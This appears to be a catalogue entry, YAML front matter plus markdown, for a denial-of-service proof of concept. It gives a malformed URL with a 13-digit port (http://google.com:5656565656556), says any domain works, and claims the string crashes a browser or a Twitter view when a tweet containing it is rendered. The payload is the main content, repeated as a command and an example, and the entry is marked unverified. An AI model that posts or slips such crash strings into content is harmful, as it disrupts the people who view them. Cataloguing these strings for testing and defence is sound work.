---
data: 'http://google.com:5656565656556'
tags:
  - dos
  - poc
type: command
output: Browser crash upon rendering
executor: text
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:56.178Z'
id: 8e2c0657-fec9-4ca6-a7fe-6bed3c035099
verified: false
validated: true
submitted: true
---
# malformed-google-url-poc

## Command

```text
http://google.com:5656565656556
```

## Description

Alternative payload demonstrating domain-agnostic DoS via 13-digit port in shared Twitter content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| port | Very long port (e.g., 5656565656556) | Yes |
| domain | Any domain (e.g., google.com) | Yes |

## Examples

### Basic Usage

```text
http://google.com:5656565656556
```

## Expected Output

Crash on tweet view due to resource exhaustion.

## Related

- [[Related Procedure]]
